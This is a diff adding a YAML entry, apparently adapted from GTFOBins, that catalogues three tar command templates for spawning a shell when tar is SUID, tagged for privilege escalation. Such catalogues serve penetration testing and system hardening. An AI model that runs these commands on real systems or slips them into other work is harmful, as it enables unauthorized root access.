@@ -1,0 +1,31 @@
+id: gtfobins/tar/shell/suid
+type: binary
+platform: linux
+name: tar
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+- template: tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
+- template: 'echo ''/bin/sh 0<&1'' >/path/to/temp-file
+
+    tar cf /path/to/temp-file.tar /path/to/temp-file
+
+    tar xf /path/to/temp-file.tar --to-command /bin/sh'
+  comment: The archive can also be prepared offline then uploaded to the target.
+references:
+- https://gtfobins.github.io/gtfobins/tar/
+tags:
+- linux
+- unix
+- gtfobins
